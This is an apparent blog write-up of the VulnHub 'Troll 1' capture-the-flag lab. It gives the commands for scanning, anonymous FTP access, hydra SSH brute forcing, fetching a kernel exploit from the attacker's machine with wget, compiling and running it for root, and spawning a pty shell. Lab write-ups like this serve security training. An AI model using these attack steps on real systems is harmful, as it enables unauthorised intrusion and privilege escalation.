---
title: "Troll 1"
date: 2024-07-10
draft: false
summary: "Writeup for Troll 1 CTF challenge on VulnHub."
tags: ["linux", "kernel exploit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/troll1/cover.webp"
  caption: "Troll 1 VulnHub Challenge"
  alt: "Troll 1 cover"
platform: "VulnHub"
---

Troll is an easy boot2root challenge on vulnhub. The goal is simple, gain root and get Proof.txt from the /root directory.
<!--more-->
To download **Troll 1** click on the link given below:
- https://www.vulnhub.com/entry/tr0ll-1,100/

## Reconnaissance

I scanned the network using **nmap** to identify the target.

```bash
nmap -sn 192.168.1.0/24                                 
```

I then performed an **nmap** aggressive scan to gather more information.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN troll1.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 21       | ftp         |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/troll1/1.webp)
![](https://cdn.ziomsec.com/troll1/2.webp)

## Initial Access

Since port 80 was open, I accessed the web application through my browser.

![](https://cdn.ziomsec.com/troll1/3.webp)

I had also identified *robots.txt* in the aggressive scan so I accessed the endpoint mentioned in it.

```shell
$ curl http://TARGET/robots.txt
$ curl http://TARGET/secret
```

![](https://cdn.ziomsec.com/troll1/4.webp)

I fuzzed for hidden files and directories but did not get anything - so I moved onto the **FTP** server. Since it allowed *anonymous* login, I logged in and found a packet capture file. For further inspection, I downloaded the packet capture on my local system.

```shell
$ ftp TARGET # username/password: anonymous
ls
get lolpcap
```

![](https://cdn.ziomsec.com/troll1/5.webp)

I then opened the packet capture file using **wireshark**.

![](https://cdn.ziomsec.com/troll1/6.webp)

While going through the packets, I found a message from the data of **secret_stuff.txt** revealing a directory called `sup3rs3cr3tdirlol`.

![](https://cdn.ziomsec.com/troll1/7.webp)

I tried accessing it on my browser browser and got a directory listing.

![](https://cdn.ziomsec.com/troll1/8.webp)

I downloaded the file and found that this was an executable.

```shell
$ wget 'http://TARGET/sup3rs3cr3tdirlol/roflmao'
$ file roflmao
```

![](https://cdn.ziomsec.com/troll1/9.webp)

I then executed the binary and received a wierd response.

```shell
$ chmod +x roflmao
$ ./roflmao
```

![](https://cdn.ziomsec.com/troll1/10.webp)

At this point, I was confused what the message meant- does it have anything to do with my memory address? 

To keep things simple, I tried accessing the provided address on my browser and found another directory listing...

![](https://cdn.ziomsec.com/troll1/11.webp)

I accessed both directories thereafter.

![](https://cdn.ziomsec.com/troll1/12.webp)

![](https://cdn.ziomsec.com/troll1/13.webp)

Since both of them contained a text file, I viewed them both using **curl**.

```shell
$ curl http://TARGET/0x0856BF/this_folder_contains_the_password/Pass.txt
$ curl http://TARGET/0x0856BF/good_luck/which_one_lol.txt
```

![](https://cdn.ziomsec.com/troll1/14.webp)

I created a wordlist using all the words, filenames that were provided/displayed.

```shell
curl http://TARGET/0x0856BF/good_luck/which_one_lol.txt
```

![](https://cdn.ziomsec.com/troll1/15.webp)

> I also removed the **`Definitely not this one`** comment from the list.

![](https://cdn.ziomsec.com/troll1/16.webp)

I then used **hydra** to bruteforce the **ssh** credentials.

```shell
hydra -L WORDLIST -P WORDLIST ssh://TARGET
```

![](https://cdn.ziomsec.com/troll1/17.webp)

Finally, I logged in as **overflow**.

```shell
ssh overflow@TARGET
```

![](https://cdn.ziomsec.com/troll1/18.webp)

## Privilege Escalation

I proceeded to navigate to the */tmp* directory and downloaded the **Linux Smart Enumeration** script to explore methods for escalating my privileges.
- https://github.com/diego-treitos/linux-smart-enumeration

![](https://cdn.ziomsec.com/troll1/19.webp)

I executed the script but did not get anything useful. Since, I had the distribution info, I looked for kernel exploits using **searchsploit**.

![](https://cdn.ziomsec.com/troll1/20.webp)

![](https://cdn.ziomsec.com/troll1/21.webp)

After finding an exploit, I downloaded it onto my system and transferred it to the target. Then I executed the exploit and got **root** access.

```shell
# On Kali
$ searchsploit -m linux/local/37292.c
$ python -m http.server 8080
```

![](https://cdn.ziomsec.com/troll1/22.webp)

```shell
# on Target
$ wget http://KALI:8080/37292.c
$ gcc 37292.c
$ ./a.out
```

![](https://cdn.ziomsec.com/troll1/23.webp)

I spawned a tty shell and captured the final flag from the */root* directory.

```shell
$ export TERM=xterm
$ python -c 'import pty;pty.spawn("/bin/bash")'
$ cd /root;cat proof.txt
```

![](https://cdn.ziomsec.com/troll1/24.webp)

## Closure

Here's a detailed account of how I compromised **Troll 1**:
- I leveraged an **FTP** anonymous login vulnerability to retrieve a **pcap** file containing directory names.
- One of these directories contained an executable, leading to further discovery of additional paths.
- These paths included a wordlist of potential usernames and passwords.
- Using this wordlist, I successfully cracked valid credentials for **SSH**.
- With SSH access secured, I employed a **kernel exploit** to escalate my privileges.
- Ultimately, I obtained **proof.txt** from the */root* directory.

That's it from my side! Happy Hacking :)

---